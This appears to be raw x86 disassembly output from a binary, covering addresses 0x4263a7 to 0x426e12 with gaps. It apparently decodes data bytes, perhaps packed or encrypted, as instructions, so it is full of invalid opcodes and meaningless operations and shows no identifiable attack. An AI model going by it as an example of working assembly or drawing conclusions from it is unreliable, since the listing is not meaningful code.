  4263a7:	(bad)  
  4263a8:	gs enter 0xa2a1,0x57
  4263ad:	retf   
  4263ae:	(bad)  
  4263af:	hlt    
  4263b0:	outs   dx,BYTE PTR ds:[esi]
  4263b1:	loopne 0x42642a
  4263b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4263b4:	mov    ebx,0x6989868b
  4263b9:	jae    0x426432
  4263bb:	push   0x11
  4263bd:	mov    DWORD PTR [edx],0x85d6c7ff
  4263c3:	add    al,0xe5
  4263c5:	xchg   edi,eax
  4263c6:	xchg   ecx,eax
  4263c7:	sbb    ebp,DWORD PTR [ebp-0x60]
  4263ca:	ret    
  4263cb:	sbb    BYTE PTR [edx+esi*8],0x3e
  4263cf:	cmp    edx,DWORD PTR [edi+0x32]
  4263d2:	aad    0xb2
  4263d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4263d5:	sahf   
  4263d6:	(bad)  [esi]
  4263d8:	or     DWORD PTR [edi-0x6d],esp
  4263db:	pop    eax
  4263dc:	xor    ah,BYTE PTR [eax-0x2165060d]
  4263e2:	or     al,0xf5
  4263e4:	cmp    BYTE PTR [edi+0x2a],ch
  4263e7:	xchg   ecx,eax
  4263e8:	mov    bl,0x5d
  4263ea:	popa   
  4263eb:	mov    cl,0x69
  4263ed:	jmp    0x322c:0xf7185387
  4263f4:	mov    edx,0xa207daab
  4263f9:	sub    al,0xbf
  4263fb:	mov    esi,0xa19bf87e
  426400:	or     eax,DWORD PTR [edx]
  426402:	dec    ebx
  426403:	adc    al,BYTE PTR [edx]
  426405:	push   ebp
  426406:	ds cdq 
  426408:	es cdq 
  42640a:	inc    edx
  42640b:	(bad)  
  42640c:	rcr    BYTE PTR [ecx],1
  42640e:	adc    al,0x9f
  426410:	adc    BYTE PTR [ecx],ah
  426412:	xchg   esi,eax
  426413:	mov    al,ds:0x21f6b339
  426418:	sub    eax,0x80197df5
  42641d:	mov    ds:0x295eb651,al
  426422:	mov    eax,0xd85beae7
  426427:	ja     0x42641e
  426429:	jno    0x4263ed
  42642b:	ja     0x42643c
  42642d:	inc    ecx
  42642e:	add    edx,DWORD PTR [eiz*2-0x117f64a5]
  426435:	sbb    al,BYTE PTR [esi]
  426437:	mov    ebp,0x511bf692
  42643c:	xor    eax,DWORD PTR [esi+0x7d]
  42643f:	xor    DWORD PTR [ebp+eiz*1+0x16704052],esi
  426446:	lods   al,BYTE PTR ds:[esi]
  426447:	icebp  
  426448:	int    0xa3
  42644a:	xchg   ecx,eax
  42644b:	fsub   QWORD PTR [ebx]
  42644d:	and    BYTE PTR [edi-0x22],0xbf
  426451:	add    bl,BYTE PTR [edx-0x121dc8e4]
  426457:	push   edx
  426458:	notrack jmp bp
  42645c:	scas   al,BYTE PTR es:[edi]
  42645d:	cdq    
  42645e:	ja     0x426467
  426460:	add    BYTE PTR [ebp+0x159a8c93],bh
  426466:	mov    esi,0x9757772a
  42646b:	push   edx
  42646c:	mov    WORD PTR [edx],gs
  42646e:	xchg   DWORD PTR [eax-0x1e6368be],esp
  426474:	mov    ?,WORD PTR [edi]
  426476:	lahf   
  426477:	push   ss
  426478:	push   ebp
  426479:	or     edx,DWORD PTR [esi-0x21]
  42647c:	sbb    BYTE PTR ds:0xdbe0360b,ch
  426482:	das    
  426483:	fstp   DWORD PTR [ecx-0x582f2c75]
  426489:	mov    ds:0x6c549f58,al
  42648e:	lea    edi,[ebx+0x0]
	...
  4264f4:	imul   ebp,DWORD PTR [edi-0x78],0xe9ef8e08
  4264fb:	outs   dx,DWORD PTR ds:[esi]
  4264fc:	vmwrite ecx,DWORD PTR [edx+0x3142be85]
  426503:	add    ah,ch
  426505:	cwde   
  426506:	add    DWORD PTR [eax],eax
  426508:	add    al,0x1
  42650a:	add    BYTE PTR [eax],al
  42650c:	in     eax,dx
  42650d:	ror    BYTE PTR [edi],cl
  42650f:	sbb    eax,0x9b424024
  426514:	rol    DWORD PTR [eax-0x5],cl
  426517:	das    
  426518:	inc    ebx
  426519:	sahf   
  42651a:	pop    esi
  42651b:	jecxz  0x4264b8
  42651d:	ins    BYTE PTR es:[edi],dx
  42651e:	sub    al,BYTE PTR [eax-0x384b312e]
  426524:	popf   
  426525:	loopne 0x4264d2
  426527:	sbb    eax,0xb18acfe0
  42652c:	xchg   bh,dl
  42652e:	mov    WORD PTR [ecx+0x24],fs
  426531:	scas   eax,DWORD PTR es:[edi]
  426532:	imul   edx,DWORD PTR [edx-0x47],0x38
  426536:	cwde   
  426537:	call   0x52f7cf37
  42653c:	clc    
  42653d:	stos   BYTE PTR es:[edi],al
  42653e:	jo     0x4264ef
  426540:	cwde   
  426541:	leave  
  426542:	inc    ecx
  426543:	sti    
  426544:	ror    ch,0xd3
  426547:	or     BYTE PTR [edi+0x43731541],bl
  42654d:	adc    DWORD PTR [edx+0x7f],ebx
  426550:	das    
  426551:	xor    cl,bh
  426553:	xor    bh,BYTE PTR [edi+0x4d]
  426556:	mov    ch,0x61
  426558:	mov    edi,0xaa70dba
  42655d:	push   ss
  42655e:	inc    edx
  42655f:	xchg   DWORD PTR [esi-0x30],ecx
  426562:	add    esi,edx
  426564:	inc    esi
  426565:	sbb    bh,BYTE PTR [edx-0x9]
  426568:	aam    0xef
  42656a:	test   DWORD PTR [eax-0x71e6ad90],0xbcdb7fba
  426574:	mov    DWORD PTR [edx+0xb66d00a],ebx
  42657a:	leave  
  42657b:	push   ebp
  42657c:	fnstsw WORD PTR [ecx]
  42657e:	add    BYTE PTR [edi+eiz*8-0x6d],bh
  426582:	add    al,0xab
  426584:	(bad)  
  426585:	xor    eax,0x581e890d
  42658a:	cmp    cl,BYTE PTR [esi-0x59]
  42658d:	shl    BYTE PTR [esi-0x4c8721e5],cl
  426593:	sub    eax,0xd03c6a7a
  426598:	retf   0x1532
  42659b:	jne    0x426547
  42659d:	retf   
  42659e:	pop    esp
  42659f:	cmc    
  4265a0:	jmp    0x4265e4
  4265a2:	sub    al,0x1b
  4265a4:	ins    WORD PTR es:[edi],dx
  4265a6:	mov    dh,0xe8
  4265a8:	in     al,dx
  4265a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4265aa:	fidiv  WORD PTR [esi]
  4265ac:	imul   BYTE PTR [ecx+0x28]
  4265af:	pop    ecx
  4265b0:	in     eax,0x57
  4265b2:	cdq    
  4265b3:	js     0x426575
  4265b5:	std    
  4265b6:	imul   ecx,DWORD PTR [edx+0x1d6c65b1],0xffffffa3
  4265bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4265be:	mov    bl,0x62
  4265c0:	push   eax
  4265c1:	mov    ah,0x61
  4265c3:	mov    dl,0xc3
  4265c5:	aad    0x64
  4265c7:	mov    dl,0xce
  4265c9:	and    eax,0x587efae0
  4265ce:	inc    esi
  4265cf:	repz std 
  4265d1:	mov    dl,al
  4265d3:	lea    ecx,[edi+0x4d]
  4265d6:	stos   BYTE PTR es:[edi],al
  4265d7:	mov    ds:0x49bf22aa,eax
  4265dc:	or     bl,BYTE PTR [edx]
  4265de:	(bad)  
  4265df:	cmp    DWORD PTR [esi],esi
  4265e1:	cdq    
  4265e2:	sbb    dl,bh
  4265e4:	mov    ebx,0x439b913b
  4265e9:	stc    
  4265ea:	mov    bl,0x17
  4265ec:	and    al,0x32
  4265ee:	or     ebx,ebx
  4265f0:	jne    0x426586
  4265f2:	clc    
  4265f3:	aas    
  4265f4:	sbb    eax,0x1d89764d
  4265f9:	imul   ebp,DWORD PTR [eax+0x7e],0x30
  4265fd:	imul   BYTE PTR [edx+0x5c597acf]
  426603:	sbb    ebx,DWORD PTR fs:[ebx]
  426606:	xchg   esi,eax
  426607:	cmp    al,0xc
  426609:	rcl    ecx,0x1c
  42660c:	js     0x4265d5
  42660e:	mov    edi,gs
	...
  426674:	adc    cl,bl
  426676:	sbb    DWORD PTR [edx],0xcb9b5ad9
  42667c:	pop    DWORD PTR [edi+0x74426da4]
  426682:	inc    ebp
  426683:	jns    0x426675
  426685:	cdq    
  426686:	add    DWORD PTR [eax],eax
  426688:	add    al,0x1
  42668a:	add    BYTE PTR [eax],al
  42668c:	cld    
  42668d:	mov    edx,esp
  42668f:	adc    edx,edi
  426691:	fwait
  426692:	cwde   
  426693:	cdq    
  426694:	in     eax,0x43
  426696:	cmp    eax,DWORD PTR [edx+ecx*4]
  426699:	lock sbb DWORD PTR [edx*8+0x11132a05],ebx
  4266a1:	mov    al,ds:0x3913e65a
  4266a6:	jb     0x4266e0
  4266a8:	push   ds
  4266a9:	sbb    al,0x2
  4266ab:	in     eax,dx
  4266ac:	mov    ebp,0xf9729cb2
  4266b1:	leave  
  4266b2:	in     eax,dx
  4266b3:	pop    ss
  4266b4:	repnz in eax,dx
  4266b6:	fistp  WORD PTR [ebx]
  4266b8:	push   edx
  4266b9:	dec    edi
  4266ba:	mov    dl,BYTE PTR [edi]
  4266bc:	mov    edx,0xf84ab59b
  4266c1:	sahf   
  4266c2:	aas    
  4266c3:	mov    gs,ebx
  4266c5:	jns    0x4266ca
  4266c7:	fidivr DWORD PTR [edi]
  4266c9:	popf   
  4266ca:	aas    
  4266cb:	pop    ecx
  4266cc:	dec    eax
  4266cd:	mov    eax,ds:0xa149c57b
  4266d2:	jbe    0x42672d
  4266d4:	jnp    0x426663
  4266d6:	xlat   BYTE PTR ds:[ebx]
  4266d7:	stos   DWORD PTR es:[edi],eax
  4266d8:	mov    al,0xb7
  4266da:	dec    ebx
  4266db:	das    
  4266dc:	lahf   
  4266dd:	mov    dh,0x1a
  4266df:	dec    eax
  4266e0:	sub    BYTE PTR ds:0xba675be8,bh
  4266e6:	js     0x426735
  4266e8:	adc    eax,edi
  4266ea:	cmp    ebp,DWORD PTR [ebx+0x32]
  4266ed:	fwait
  4266ee:	test   edx,ebx
  4266f0:	mov    ch,0xab
  4266f2:	pop    eax
  4266f3:	out    dx,eax
  4266f4:	ss in  al,0xa5
  4266f7:	mov    ebp,0xa632e09e
  4266fc:	jle    0x42670a
  4266fe:	add    dl,BYTE PTR [esi-0x78]
  426701:	pop    ebx
  426702:	add    ebp,DWORD PTR [edi+0x2793099b]
  426708:	inc    eax
  426709:	std    
  42670a:	adc    al,0x62
  42670c:	test   BYTE PTR [esi-0xe],cl
  42670f:	push   0x1a8ff4f6
  426714:	lock in al,dx
  426716:	repz mov ebp,0x57e9daa5
  42671c:	cmp    dh,bl
  42671e:	sahf   
  42671f:	mov    cl,0x7a
  426721:	pop    esi
  426722:	aaa    
  426723:	fwait
  426724:	shl    DWORD PTR [ebp-0x2f],1
  426727:	sub    ecx,eax
  426729:	mov    ds,WORD PTR [ecx-0x3]
  42672c:	stos   DWORD PTR es:[edi],eax
  42672d:	jp     0x426794
  42672f:	int    0xf
  426731:	fisubr WORD PTR [esi+0x2]
  426734:	shr    BYTE PTR [edx],0x5f
  426737:	test   DWORD PTR [ecx-0x67],eax
  42673a:	jmp    0x3b15a2ab
  42673f:	or     bl,BYTE PTR [ebx+0x91b2a7b]
  426745:	addr16 das 
  426747:	mov    ebp,0x22b47cc7
  42674c:	mov    edi,0xc1dc1938
  426751:	mov    ds:0x37e03452,eax
  426756:	xor    al,dl
  426758:	push   cs
  426759:	dec    eax
  42675a:	mov    ch,0x5e
  42675c:	daa    
  42675d:	mov    eax,ds:0x4fcf5e62
  426762:	pop    edi
  426763:	cmp    al,0xd0
  426765:	mov    ecx,0x4a5e9061
  42676a:	push   cs
  42676b:	cs push ebp
  42676d:	fcomp  DWORD PTR [ebp+0x64]
  426770:	pop    esi
  426771:	outs   dx,BYTE PTR ds:[esi]
  426772:	retf   0x1b4b
  426775:	popf   
  426776:	jl     0x4267b3
  426778:	mov    esi,0x23724e6
  42677d:	cs inc edi
  42677f:	sub    al,0xee
  426781:	aaa    
  426782:	aaa    
  426783:	pop    ss
  426784:	and    al,BYTE PTR [edx]
  426786:	nop
  426787:	or     eax,0x57a8bfdc
  42678c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42678d:	pop    eax
  42678e:	push   cs
  42678f:	mov    ecx,0x0
	...
  4267f4:	mov    eax,0xff2ace8d
  4267f9:	imul   edi,esp,0xffffff9f
  4267fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4267fd:	and    dh,0xca
  426800:	adc    dh,BYTE PTR [eax]
  426802:	(bad)  [ebp-0xc]
  426805:	call   0x0:0x1040001
  42680c:	shl    DWORD PTR [esp],1
  42680f:	fsubr  DWORD PTR [ebx+0x3a]
  426812:	jne    0x4267c6
  426814:	jg     0x4267ad
  426816:	sub    ebx,DWORD PTR [ebx+esi*1+0x18]
  42681a:	or     al,0x99
  42681c:	cbw    
  42681e:	loope  0x42682a
  426820:	idiv   DWORD PTR [esi-0x67dc7859]
  426826:	loop   0x426885
  426828:	pop    eax
  426829:	jmp    0x8b45e453
  42682e:	mov    bl,dh
  426830:	lahf   
  426831:	loope  0x42680b
  426833:	xchg   dl,al
  426835:	mov    dl,0x32
  426837:	pop    ecx
  426838:	pop    DWORD PTR [ebx-0x38]
  42683b:	dec    esp
  42683c:	or     DWORD PTR [edi-0x409172a7],ebp
  426842:	not    DWORD PTR [ebx]
  426844:	(bad)  
  426845:	fs and al,0x0
  426848:	dec    esi
  426849:	xor    al,0xf1
  42684b:	imul   ebx,DWORD PTR [edx-0x22498b79],0xffffffa5
  426852:	test   DWORD PTR [ebx-0x30],eax
  426855:	fstp   DWORD PTR [edi+0x25]
  426858:	inc    esi
  426859:	in     eax,dx
  42685a:	nop
  42685b:	test   BYTE PTR [edi+ecx*1+0x21],al
  42685f:	outs   dx,BYTE PTR ds:[esi]
  426860:	shl    ebx,0x6
  426863:	xor    ebx,edi
  426865:	sbb    DWORD PTR [eax+0x38],0x4ed372e5
  42686c:	scas   eax,DWORD PTR es:[edi]
  42686d:	cmp    al,0x26
  42686f:	retf   
  426870:	ret    0x4ca2
  426873:	mov    dl,0x79
  426875:	pop    edx
  426876:	ss push esp
  426878:	cwde   
  426879:	clc    
  42687a:	les    ebp,FWORD PTR [ecx-0x8]
  42687d:	xchg   edx,ecx
  42687f:	js     0x4268a4
  426881:	fyl2x  
  426883:	add    DWORD PTR [eax-0x6976dee5],0x3a
  42688a:	stos   BYTE PTR es:[edi],al
  42688b:	aam    0x7c
  42688d:	sahf   
  42688e:	push   ecx
  42688f:	test   eax,0xac27c354
  426894:	sub    edx,0x84be5124
  42689a:	xor    dl,bl
  42689c:	sbb    ebp,DWORD PTR [ebp-0x4ab63456]
  4268a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4268a3:	jmp    0x42689b
  4268a5:	cmp    eax,0x320d5d54
  4268aa:	and    eax,0x5b675b9d
  4268af:	pop    eax
  4268b0:	sbb    DWORD PTR [eax-0x37],eax
  4268b3:	dec    ebx
  4268b4:	cmp    cl,dl
  4268b6:	arpl   WORD PTR [ecx],cx
  4268b8:	inc    ebp
  4268b9:	mov    al,0xa8
  4268bb:	adc    BYTE PTR [esp+eax*8],bl
  4268be:	arpl   WORD PTR [eax+0x72679f22],di
  4268c4:	mov    ah,al
  4268c6:	jo     0x4268b0
  4268c8:	sub    DWORD PTR [edx-0x7ce57476],edx
  4268ce:	sbb    esp,DWORD PTR [ecx-0xb]
  4268d1:	int3   
  4268d2:	pop    edi
  4268d3:	lea    eax,[ecx]
  4268d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4268d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4268d7:	pop    ss
  4268d8:	pop    es
  4268d9:	mov    ecx,0x23418d7e
  4268de:	gs push ds
  4268e0:	aad    0xfc
  4268e2:	or     eax,0xa929ce4a
  4268e7:	and    DWORD PTR [ecx],0x26
  4268ea:	jmp    0x5bd3:0xa5705f59
  4268f1:	or     bh,BYTE PTR [edx]
  4268f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4268f4:	add    esi,esi
  4268f6:	mov    DWORD PTR [ebp+0x55],ecx
  4268f9:	fsub   QWORD PTR [edx+0x6307032c]
  4268ff:	add    DWORD PTR [edi-0xf],edi
  426902:	ret    
  426903:	adc    eax,0x9f6e12de
  426908:	inc    esi
  426909:	mov    ds:0xea86581a,eax
  42690e:	ss mov bl,0x0
	...
  426971:	add    BYTE PTR [eax],al
  426973:	add    BYTE PTR [esi+ecx*2+0x7fff7d7d],cl
  42697a:	mov    edi,?
  42697c:	sub    ebp,esp
  42697e:	lahf   
  42697f:	mov    ebp,DWORD PTR [edx-0x78]
  426982:	mov    esp,0x19bf8dd
  426987:	add    BYTE PTR [ecx+eax*1],al
  42698a:	add    BYTE PTR [eax],al
  42698c:	pusha  
  42698d:	add    BYTE PTR [ebx],ah
  42698f:	popa   
  426990:	push   esp
  426991:	or     eax,0x9643babf
  426996:	fst    QWORD PTR [ebx]
  426998:	jge    0x426943
  42699a:	stos   BYTE PTR es:[edi],al
  42699b:	adc    cl,BYTE PTR [edi]
  42699d:	push   esi
  42699e:	push   es
  42699f:	inc    esi
  4269a0:	push   edx
  4269a1:	es pop ebx
  4269a3:	je     0x4269df
  4269a5:	or     bl,BYTE PTR [ecx-0x20]
  4269a8:	mov    ds:0x6b569836,al
  4269ad:	scas   al,BYTE PTR es:[edi]
  4269ae:	sbb    esp,DWORD PTR [edi-0x598c477c]
  4269b4:	or     edi,ecx
  4269b6:	sbb    dl,0xb1
  4269b9:	popf   
  4269ba:	and    edx,DWORD PTR [edx-0xe8761a6]
  4269c0:	pop    ds
  4269c1:	data16 jle 0x426a1b
  4269c4:	xor    DWORD PTR [esi],0x4edc9c84
  4269ca:	mov    bh,0x68
  4269cc:	mov    ebp,0x3d6f0b29
  4269d1:	inc    ebx
  4269d2:	mov    esi,DWORD PTR [ebp+0x7e9a4266]
  4269d8:	test   al,0x23
  4269da:	xchg   edx,ecx
  4269dc:	outs   dx,DWORD PTR ds:[esi]
  4269dd:	sub    eax,0x7d53fad1
  4269e2:	dec    ecx
  4269e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269e4:	cwde   
  4269e5:	out    dx,eax
  4269e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4269e7:	imul   DWORD PTR [ebp-0xbdd4475]
  4269ed:	mov    bh,0x1c
  4269ef:	dec    ebp
  4269f0:	pop    ss
  4269f1:	(bad)  
  4269f2:	int    0xcf
  4269f4:	fnstcw WORD PTR [esi-0x46ef638c]
  4269fa:	int    0xf0
  4269fc:	mov    ebp,0x329e7490
  426a01:	xchg   bl,ch
  426a03:	int    0x2b
  426a05:	fsubr  QWORD PTR [ecx]
  426a07:	mov    BYTE PTR [ebp+0x5f],ah
  426a0a:	inc    edi
  426a0b:	js     0x426a27
  426a0d:	int3   
  426a0e:	cmp    eax,eax
  426a10:	pop    edx
  426a11:	ss addr16 js 0x4269e2
  426a15:	imul   esi,DWORD PTR [eax+0x7f],0x9cf6c0c9
  426a1c:	xchg   edx,eax
  426a1d:	test   DWORD PTR [eax-0x5a],0x50791ec9
  426a24:	test   dl,0xe8
  426a27:	dec    edx
  426a28:	push   eax
  426a29:	cmp    eax,ebp
  426a2b:	icebp  
  426a2c:	sbb    DWORD PTR [eax+0x4],esi
  426a2f:	(bad)  
  426a30:	loopne 0x426a60
  426a32:	xchg   ebx,eax
  426a33:	(bad)  
  426a34:	sub    eax,0xd308fe74
  426a39:	leave  
  426a3a:	xchg   esp,eax
  426a3b:	or     DWORD PTR ds:0xa454f9f8,ebx
  426a41:	jbe    0x426a23
  426a43:	bound  eax,QWORD PTR [edx]
  426a45:	out    dx,al
  426a46:	push   edx
  426a47:	test   BYTE PTR [ebx+ecx*8+0x2ea01676],ch
  426a4e:	sub    eax,0xde63765c
  426a53:	add    BYTE PTR [edi+0x3],al
  426a56:	dec    edi
  426a57:	push   ss
  426a58:	daa    
  426a59:	xchg   BYTE PTR [esi+0x3ba798e5],dh
  426a5f:	mov    edi,0x333f2b1f
  426a64:	in     al,dx
  426a65:	mov    esp,0xc4bc6e57
  426a6a:	clc    
  426a6b:	cmp    DWORD PTR [esp+ebx*8+0x50],eax
  426a6f:	cmp    cl,BYTE PTR [edi]
  426a71:	scas   eax,DWORD PTR es:[edi]
  426a72:	sub    DWORD PTR [ebx-0x3ea8ee07],ecx
  426a78:	push   ss
  426a79:	and    ebp,DWORD PTR [eax-0x29]
  426a7c:	idiv   eax
  426a7e:	adc    bh,BYTE PTR [ebx]
  426a80:	dec    edi
  426a81:	pop    eax
  426a82:	(bad)  
  426a83:	cld    
  426a84:	sub    BYTE PTR [edi-0x17],0x7
  426a88:	jmp    0xa70c:0xf9aa781
  426a8f:	in     eax,dx
	...
  426af4:	cdq    
  426af5:	sub    BYTE PTR ds:0xdb77bd56,cl
  426afb:	out    dx,eax
  426afc:	inc    esi
  426afd:	sub    DWORD PTR [esi],edi
  426aff:	or     al,0x45
  426b01:	push   cs
  426b02:	fcom   st(2)
  426b04:	cld    
  426b05:	pushf  
  426b06:	add    DWORD PTR [eax],eax
  426b08:	add    al,0x1
  426b0a:	add    BYTE PTR [eax],al
  426b0c:	jnp    0x426b0f
  426b0e:	outs   dx,DWORD PTR ds:[esi]
  426b0f:	icebp  
  426b10:	dec    esp
  426b11:	jmp    0x929b:0x81c6cf06
  426b18:	jg     0x426ab8
  426b1a:	je     0x426b7b
  426b1c:	mov    ds:0x979bc3b4,al
  426b21:	(bad)  
  426b22:	retf   
  426b23:	and    BYTE PTR [ecx+ebp*4],0x6
  426b27:	dec    eax
  426b28:	stc    
  426b29:	xor    DWORD PTR [ebx-0x74874de9],esp
  426b2f:	(bad)  
  426b30:	in     al,dx
  426b31:	jbe    0x426b2b
  426b33:	std    
  426b34:	pop    ss
  426b35:	(bad)
  426b38:	xor    ch,al
  426b3a:	push   es
  426b3b:	adc    DWORD PTR [ebp+0x22],ebp
  426b3e:	test   BYTE PTR [esi-0x40],ch
  426b41:	test   DWORD PTR [ebx+0x22],esp
  426b44:	jle    0x426b7d
  426b46:	inc    edx
  426b47:	jb     0x426b8a
  426b49:	fist   DWORD PTR [esi+0x64ae1628]
  426b4f:	xlat   BYTE PTR ds:[ebx]
  426b50:	xor    ecx,DWORD PTR [ebx+0xf]
  426b53:	test   DWORD PTR [edx-0x2d],ebx
  426b56:	(bad)  
  426b57:	cmp    edx,DWORD PTR [ebp-0x1b046cd0]
  426b5d:	daa    
  426b5e:	adc    esp,DWORD PTR [edx]
  426b60:	inc    eax
  426b61:	inc    ebp
  426b62:	stos   BYTE PTR es:[edi],al
  426b63:	inc    BYTE PTR [eax+ebp*4-0x5f5d81f1]
  426b6a:	pop    esi
  426b6b:	jg     0x426b83
  426b6d:	aad    0x78
  426b6f:	mov    DWORD PTR [ecx+0x75],0x31feea21
  426b76:	pop    edi
  426b77:	mov    cl,0xf
  426b79:	add    eax,0xc6fd719
  426b7e:	outs   dx,DWORD PTR ds:[esi]
  426b7f:	fxch   st(4)
  426b81:	jl     0x426b13
  426b83:	cld    
  426b84:	adc    ah,bh
  426b86:	pusha  
  426b87:	(bad)  
  426b88:	mov    ds:0xb16119b9,eax
  426b8d:	add    ecx,DWORD PTR gs:[ebp+0x20c1a02e]
  426b94:	or     eax,0x5f938cad
  426b99:	add    eax,0x795b20ca
  426b9e:	ja     0x426b8f
  426ba0:	fstp   st(1)
  426ba2:	add    al,0x36
  426ba4:	rcl    BYTE PTR [edx],1
  426ba6:	(bad)  
  426ba7:	sub    eax,0x6daab150
  426bac:	push   ss
  426bad:	adc    edi,DWORD PTR [esi+0x17]
  426bb0:	outs   dx,BYTE PTR ds:[esi]
  426bb1:	push   ecx
  426bb2:	and    esp,0x17
  426bb5:	pop    ecx
  426bb6:	pop    edx
  426bb7:	pop    edx
  426bb8:	mov    edi,0xd92362b5
  426bbd:	clc    
  426bbe:	sti    
  426bbf:	pusha  
  426bc0:	sar    DWORD PTR [esi-0xc],0xb4
  426bc4:	ret    0x537d
  426bc7:	cmp    al,0x60
  426bc9:	adc    BYTE PTR [edx-0x72391c2f],bh
  426bcf:	jbe    0x426b6b
  426bd1:	fidiv  DWORD PTR [edx-0x4bf3e2cb]
  426bd7:	sbb    al,0x71
  426bd9:	ret    
  426bda:	scas   al,BYTE PTR es:[edi]
  426bdb:	in     al,0xa4
  426bdd:	pushf  
  426bde:	inc    esp
  426bdf:	mov    ds:0x81ab077c,al
  426be4:	lds    esi,FWORD PTR [ecx]
  426be6:	or     ecx,esp
  426be8:	add    DWORD PTR [edi],0xffffff82
  426beb:	jmp    0xf407e7e7
  426bf0:	mov    ebp,0x33da06b6
  426bf5:	idiv   DWORD PTR [edi]
  426bf7:	js     0x426b95
  426bf9:	sbb    BYTE PTR [edi+ebp*8-0x32],ah
  426bfd:	mov    al,0x31
  426bff:	inc    esp
  426c00:	mov    WORD PTR es:[edx+0x709aeed1],gs
  426c07:	imul   ebx,DWORD PTR [edi+0x7114182c],0xffffffa3
  426c0e:	pop    esp
  426c0f:	mov    ecx,0x0
	...
  426c74:	loop   0x426cd6
  426c76:	test   DWORD PTR [esi+0x74f3f787],esi
  426c7c:	mov    ah,0xeb
  426c7e:	cld    
  426c7f:	mov    edx,0x53530350
  426c84:	add    BYTE PTR [esi+0x1040001],bl
  426c8a:	add    BYTE PTR [eax],al
  426c8c:	jle    0x426ccb
  426c8e:	sbb    ebx,DWORD PTR [ecx]
  426c90:	imul   ecx,DWORD PTR [ecx+edx*4+0x75],0xffffff9c
  426c95:	xchg   DWORD PTR [ebx+ebp*2+0x117bd385],esp
  426c9c:	add    al,0x84
  426c9e:	hlt    
  426c9f:	add    al,0xc1
  426ca1:	ret    0x906e
  426ca4:	dec    edx
  426ca5:	or     eax,0x132e59a7
  426caa:	(bad)  
  426cac:	loop   0x426d12
  426cae:	popf   
  426caf:	mov    ds:0xdd9d7308,al
  426cb4:	add    eax,0x72e18556
  426cb9:	pop    eax
  426cba:	jp     0x426cf3
  426cbc:	xchg   ebp,eax
  426cbd:	jns    0x426d13
  426cbf:	mov    edx,ebp
  426cc1:	adc    esp,0x42
  426cc4:	push   ss
  426cc5:	mov    ch,0x3b
  426cc7:	stos   BYTE PTR es:[edi],al
  426cc8:	in     al,0x28
  426cca:	or     BYTE PTR [edi+0x170cdd63],al
  426cd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426cd1:	mov    WORD PTR [edi],?
  426cd3:	bswap  ecx
  426cd5:	cdq    
  426cd6:	push   edx
  426cd7:	jl     0x426c70
  426cd9:	jp     0x426c66
  426cdb:	inc    edi
  426cdc:	imul   ah
  426cde:	add    al,0x8a
  426ce0:	js     0x426cf9
  426ce2:	mov    ds:0x933572c6,al
  426ce7:	lods   al,BYTE PTR ds:[esi]
  426ce8:	aam    0xd3
  426cea:	jle    0x426cf3
  426cec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426ced:	push   ss
  426cee:	jg     0x426d07
  426cf0:	ret    0x128e
  426cf3:	xor    cl,BYTE PTR [edx+esi*4-0x163c1208]
  426cfa:	xchg   ebx,eax
  426cfb:	mov    al,ds:0xc4abc9ac
  426d00:	rep outs dx,BYTE PTR ds:[esi]
  426d02:	xor    bl,BYTE PTR [edi-0x6a7d179e]
  426d08:	mov    dh,0xc0
  426d0a:	pop    esi
  426d0b:	sbb    ebx,DWORD PTR [edi+0x5e]
  426d0e:	and    BYTE PTR [ecx],al
  426d10:	adc    edi,ecx
  426d12:	je     0x426d4c
  426d14:	sub    BYTE PTR [esi-0x3e3147b4],0x31
  426d1b:	jl     0x426cc5
  426d1d:	es enter 0x1337,0xdd
  426d22:	rol    BYTE PTR [esi+edi*2],0xd2
  426d26:	and    al,0xca
  426d28:	repnz icebp 
  426d2a:	popa   
  426d2b:	aam    0x34
  426d2d:	fnstsw WORD PTR gs:[ebx]
  426d30:	popfw  
  426d32:	mov    ebp,DWORD PTR [eax+0x1cd522b1]
  426d38:	sahf   
  426d39:	pop    es
  426d3a:	je     0x426d75
  426d3c:	adc    BYTE PTR [esi],bl
  426d3e:	jmp    0x1983:0xe7f4400e
  426d45:	ins    BYTE PTR es:[edi],dx
  426d46:	popa   
  426d47:	cli    
  426d48:	das    
  426d49:	cmp    BYTE PTR [ebx],bl
  426d4b:	dec    esp
  426d4c:	aaa    
  426d4d:	loopne 0x426d53
  426d4f:	sub    bh,BYTE PTR [esi+ebx*1]
  426d52:	and    esi,DWORD PTR [edx+0x29]
  426d55:	xchg   ebp,ebx
  426d57:	imul   esi,DWORD PTR [edx+0x1dae799f],0x4f
  426d5e:	ja     0x426ddf
  426d60:	push   esi
  426d62:	sub    eax,0xfcedcbca
  426d67:	idiv   BYTE PTR [ebx]
  426d69:	les    esi,FWORD PTR [edi-0x57]
  426d6c:	mov    bh,0xb4
  426d6e:	fstp   DWORD PTR [ebx]
  426d70:	mov    dh,0xf7
  426d72:	jmp    0xfd870aa3
  426d77:	sub    bl,0x4b
  426d7a:	leave  
  426d7b:	lds    edi,FWORD PTR [edi+0x763fd5e6]
  426d81:	mov    dh,0x89
  426d83:	push   ebx
  426d84:	ins    WORD PTR es:[edi],dx
  426d86:	stos   BYTE PTR es:[edi],al
  426d87:	repz in eax,dx
  426d89:	push   es
  426d8a:	pop    ds
  426d8b:	outs   dx,DWORD PTR ds:[esi]
  426d8c:	ds aas 
  426d8e:	or     al,0x56
	...
  426df4:	or     dh,BYTE PTR [ecx-0xc040c9f]
  426dfa:	call   0x400c:0xc7c2ecf9
  426e01:	es jbe 0x426dbd
  426e04:	add    al,0x9f
  426e06:	add    DWORD PTR [eax],eax
  426e08:	add    al,0x1
  426e0a:	add    BYTE PTR [eax],al
  426e0c:	mov    eax,0xc19558cb
  426e11:	inc    eax
  426e12:	mov    WORD PTR [ebx],fs
